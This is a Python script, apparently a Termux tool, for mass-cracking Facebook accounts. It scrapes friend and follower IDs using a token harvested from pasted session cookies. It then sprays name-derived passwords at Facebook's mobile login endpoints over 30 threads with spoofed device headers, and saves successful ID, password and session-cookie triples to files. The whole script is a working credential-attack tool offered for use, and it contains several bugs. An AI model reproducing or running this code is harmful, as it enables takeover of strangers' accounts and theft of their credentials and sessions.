head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
logo =                                          """            
\033[1;37m    #             
\033[1;37m   # #   #      # 
\033[1;37m  #   #  #      # 
\033[1;37m #     # #      # 
\033[1;37m ####### #      # 
\033[1;37m #     # #      # 
\033[1;37m #     # ###### # 
\033[1;37m------------------------------------------------
\033[1;37m Facebook:            Shahzaib Ali 
\033[1;37m WhatsApp :            +923246258722
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' The Process has been Complete...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back Ali Menu ")
        exit()

def Ali():   
    os.system('clear')
    print(logo)
    print(f'[1] File Crack')
    print(f'[2] Public ID Crack')
    print(f'[3] Random Crack ')
    print(f'[4] Create File')
    print(f'[5] Login Tool')
    print(f'[6] Logout Cookie')
    print(f'[7] Remove Trash Files ')
    print(f'[8] Separate Ids')
    print(f'[9] Remove Duplicate IDs')
    print(f'[W] Join Whatsapp Group ')
    print(f'[F] Join Facebook Group ')
    print('')
    select = input('Select Menu>: ')
    if select =='1':
        method_crack()
    elif select =='2':
        exit(' This is Option Soon available ... ')
    elif select =='3':
        random_number()
    elif select =='4':
       menu()
    elif select =='5':
       login()
    elif select =='6':
       remove_Tc()
    elif select =='7':
       removef()
    elif select =='8':
       sids()
    elif select =='9':
       cutter()
    elif select =='W':
        os.system('xdg-open https://chat.whatsapp.com/J3gpK8NYNQBHhEYnVxN4X7')
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/3017062245271082/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        Ali(allkey)
        
def method_crack():
    global methods
    clear()
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method {3}')
    #print(f'[4] Method {4}')
    print(f'[0] Back')
    print('')
    option = input('Select method>: ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
   # elif option =='4':
    #    methods.append('methodD')
   #     main_crack().crack(id)
    elif option =='0':
        Ali()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ali] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildvsskj(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Alib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Alib};{ckkk}"
                    print(f"\r{R} [Ali-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ali_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Ali_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [Ali-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Ali_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ali] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id":adid,
"cpl": "true",
'family_device_id':nmm,
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"source": "login","format": "json",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"generate_analytics_claim": "1",
"generate_machine_id": "1",
"meta_inf_fbmeta": "",
"advertiser_id":adid,
"currently_logged_in_userid": "0",
"locale":"en_US","client_country_code":"US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildHHL(),
'content-type':'application/x-www-form-urlencoded',
			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-type':'MOBILE.LTE',
			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
			'user-agent':ua,
			'x-fb-net-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
			'x-fb-connection-quality':'EXCELLENT',
			'Connection': 'keep-alive',
			'x-fb-friendly-name':'ViewerReactionsMutation',
			'accept-encoding':'gzip, deflate',
			'accept': '*/*',
			'x-fb-http-engine': 'Liger',
			'content-length': '204'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Alib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Alib};{ckkk}"
                    print(f"\r{R} [Ali-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ali_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Ali_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Ali-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Ali_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Ali] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id":adid,
"cpl": "true",
'family_device_id':nmm,
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"source": "login","format": "json",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"generate_analytics_claim": "1",
"generate_machine_id": "1",
"meta_inf_fbmeta": "",
"advertiser_id":adid,
"currently_logged_in_userid": "0",
"locale":"en_US","client_country_code":"US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': randBuildHHL(),
'content-type':'application/x-www-form-urlencoded',
			'x-fb-sim-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-type':'MOBILE.LTE',
			'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
			'user-agent':ua,
			'x-fb-net-hni':str(random.randint(2e4,4e4)),
			'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
			'x-fb-connection-quality':'EXCELLENT',
			'Connection': 'keep-alive',
			'x-fb-friendly-name':'ViewerReactionsMutation',
			'accept-encoding':'gzip, deflate',
			'accept': '*/*',
			'x-fb-http-engine': 'Liger',
			'content-length': '204'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Alib = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Alib};{ckkk}"
                    print(f"\r{R} [Ali-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ali_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Ali_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Ali-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Ali_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Ali] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(sagent)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Ali-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Ali_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [Ali-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Ali_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print('Put limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 20:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{A}Use flight (airplane) mode before use {S}")
            print(47*"-")
            print(f'{S} Total IDs : %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(47*"-")
            with AliAli(max_workers=30) as Aliworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                Aliworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Aliworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Aliworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                Aliworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
            

def remove_Tc():
        os.system('rm -rf .token.txt .cookie.txt');print(f'\n{F}Logout Successfully ...')
        login()
        
def login():
    clear()
    print('\x1b[00m\tLogin Using Cookies') 
    try:
        fbcokis= input('\n\x1b[00mPut Cookies:\x1b[92m')
        fact = requests.get("https://adsmanager.facebook.com/adsmanager/", cookies = {"cookie":fbcokis},headers=head).text
        act = re.search("act=(.*?)&nav_source",str(fact)).group(1)
        ftoken = requests.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&nav_source=no_referrer", cookies = {"cookie":fbcokis}).text
        eaab = re.search('accessToken="(.*?)"',str(ftoken)).group(1)
        open(".tokn.txt", "w").write(eaab)
        open(".cokis.txt", "w").write(fbcokis)
        token = open('.tokn.txt','r').read()
        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        print(f"{R}Login Successfully")
        menu()
    except Exception as error: 
        os.system("rm -f .tokn.txt")
        print("\x1b[1;91m\n\t\t[!] Cookies Expired ")
        slp(2)
        login()

def public():
    fbidz = []
    clear()
    print(logo)
    global totaldmp,count,srange 
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        print(f"{A}Cookie Expired ")
        slp(1)
        cmd('rm -rf .token.txt .cokis.txt')
        login()
    try:
        clear()
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        for rept in range(srange):
            rept += 1
            fbuid = input("[" + str(rept) + "] Put id username: ")
            clear()
            if  fbuid=='stop':
                break
                ys.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    fbidz.append(idnm['id'])
            except KeyError:
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/Ali.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
        apnd = open(filepath,'w')
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
                pass
                fx = (str(len(open(filepath,'r').readlines())))
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
        print(47*"-")
        print (f"Total IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
        menu()
    except Exception as e:
        exit("[*] Error : %s"%e)
        
def follower():
    fbidz = []
    clear()
    global totaldmp,count
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        print(f"{A}Cookie Expired ")
        slp(1)
        cmd('rm -rf .tokn.txt .cokis.txt')
        login()
    try:
        clear()
        try:
            fbbuid = input("Put Id Username: ")
            clear()
            dmp = requests.get("https://graph.facebook.com/"+fbbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            for idnm in dmp['friends']['data']:
                totaldmp+=1
                fbidz.append(idnm['id'])
        except KeyError:
            print(f"{A}ID Not Public");time.sleep(1)
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/Ali.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
        apnd = open(filepath,'w')
        for fbuid in fbidz:
            count += 1
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"?fields=subscribers.limit(5000)&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['subscribers']['data']:
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')
                pass
                fx = (str(len(open(filepath,'r').readlines())))
                sys.stdout.write(f"\r\r{S}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
        print(47*"-")
        print (f"Total IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
        print (f"File Saved To : {filepath} ")
        print(47*"-")
        input("Press Enter To Back Menu ")
        menu()
    except Exception as e:
        exit("[*] Error : %s"%e)

def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input('Put File Name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    clear()
    print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
    limit = int(input('How many links do you want to separate?: '))
    clear()
    print('\033[1;37mExample: /sdcard/Ali.txt\033[0;97m')
    print(47*'-')
    new_save = input('Save new file as: ')
    clear()
    print('\033[1;37mExample: 10008,10007,10006')
    print(47*'-')
    y = 0
    for k in range(limit):
        y+=1
        links = input('Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(47*'-')
    print('Links grabbed successfully')
    print('Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print('New file saved as: '+new_save)
    print(47*'-')
    input('Press enter to back Menu ')
    menu()
    
def cutter():
    os.system('clear')
    print(logo)
    print("Enter File Path / File Location \n")
    Ali = input('Put File Name :')
    print(" ")
    Ali = input('Saving Put File Name :')
    os.system('touch ' +Ali)
    os.system('sort -r '+Ali+' | uniq > '+Ali)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + Ali )
    print(47*'-')
    print("File Saved To :" + Ali )
    print(47*'-')
    input(f"{S} Press Enter To Back Ali Menu ")
    menu
       

#------[ MAIN MENU ]--------->>
def menu():
    clear()
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        nam = info['name']
        uid = info['id']
    except Exception as error:print ("\n\x1b[1;91m[*] Token Expired");slp(1);login()
    clear()
    print(f'Name : {nam} | ID : {uid}  ')
    print(47*"-")
    print(f'[1] Dump From Public [Simple]')
    print(f'[2] Dump From Public [Ultimated-auto-separate]')
    print(f'[3] Dump From Public [Ultimated]')
    print('[4] Dump From Follower [Ultimated]')
    print('[5] Remove Duplicate Links ')
    print('[6] Seprate Links ')
    print('[0] Remove Cookie ')
    print(47*"-")
    select = input('Select Menu: ')
    if select =='1':
        p_dump()
    elif select =='2':
        dump()
    elif select =='3':
        public()
    elif select =='4':
        follower()
    elif select =='5':
        cutter()
    elif select =='6':
        sids()
    elif select =='0':
        os.system('rm -rf .tokn.txt')
        os.system('rm -rf .cookis.txt')
        print(f'{F}Logout Successful');time.sleep(1)
        menu()
        
def push(fbuid,file,fbcokis,token,mission,typ):
    global filter,totaldmp
    try:
        if int(totaldmp)>=int(mission):
            filter = 'Closed'
        else:
            #and type in idnm['id']
            dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            print(f'\r Dumping : {fbuid}  IDs : {totaldmp}')
            for idnm in dmp['friends']['data']:
                if idnm['id'] not in filter:
                    if str(typ) in idnm['id']:
                        filter.append(idnm['id'])
                        open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                        totaldmp+=1
    except Exception as error:
        pass

def sent(file,fbcokis,token):
    global saved,totaldmp
    try:
        clear()
        print('How Many IDs You Want To Dump \nExample : 1000,5000,10000\n')
        mission = int(input('Enter limit: \x1b[1;92m'))
        clear()
        print('Which IDs You Want To Dump \nExample : 10008,100087,10007,mix\n')
        typ = input('Links: \x1b[1;97m')
        if 'mix' in typ.lower():
            typ = '1'
        clear()
        for fbuid in saved:
            fast_work(push,fbuid,file,fbcokis,token,mission,typ)
    except Exception as error:
        exit(f'----------------------------------------------------------\nTotal Dumped - {totaldmp} IDs \nSaved To = {file}\n----------------------------------------------------------')

def dump():
    global saved,totaldmp
    clear()
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        login()
    except:
        login()
    try:
        print('Enter Dump ID Save Path\n')
        file = input('Enter File:\x1b[1;97m ')
        clear()
        print('IF You Want To Back To Menu. Then Type \'B\' \n')
        while True:
            try:
                fbuid = input('Put id username:\x1b[1;97m ')
                if 'B' in fbuid.upper():
                    menu()
                    break
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                    totaldmp+=1
                    saved.append(idnm['id'])
                print(f'Total Target Found:\x1b[1;97m {len(saved)}')
                slp(2)
                sent(file,fbcokis,token)
                break
                exit('Bye Bye')
            except:
                print('ID Not Public')
                continue
    except Exception as error:
        menu()

def p_dump():
    global totaldmp,srange
    try:
        token = open('.tokn.txt','r').read()
        fbcokis = open(".cokis.txt", "r").read()
    except FileNotFoundError:
        print(f"{A}\n\t\tCookie Not Found ...{S}")
        slp(1)
        cmd('rm -rf .token.txt .cookie.txt')
        login()
    try:
        token = open('.tokn.txt','r').read()
        fbcokis = open(".cokis.txt", "r").read()
    except FileNotFoundError:
        print(f"{A}Cookie Not Found ...{S}")
        slp(1)
        cmd('rm -rf .token.txt .cookie.txt')
        login()
    try:
        clear()
        
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/Ali.txt\n') 
        filepath = input("Put File Name: ")
        apnd = open(filepath , 'a')
        clear()
        for rept in range(srange):
            rept += 1
            sid = input("[" + str(rept) + "] Put id username: ")
            if  sid=='stop':
                break
                ys.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+sid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')                      
            except KeyError:
                print(f"\n{S}ID Not Found ...");pass
            print(f'{S}Total IDs : {totaldmp}')
        apnd.close()
        print(47*'-')
        print(f"Total IDs: {totaldmp} ")
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back Ali Menu ")
        Ali(allkey)
    except Exception as e:
        print("Error : %s"%e) 
        
def cutter():
    clear()
    print("Enter File Path / File Location \n")
    Ali = input('Put File Name:')
    print(" ")
    Ali = input('Saving Put File Name:')
    os.system('touch ' +Ali)
    os.system('sort -r '+Ali+' | uniq > '+Ali)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + Ali )
    print("New File Saved:" + Ali )
    print(47*'-')
    input(f"{S} Press Enter To Back Ali Menu ")
    Ali(allkey)       
    
def removef():
        os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
        Ali(allkey)            
 

Ali()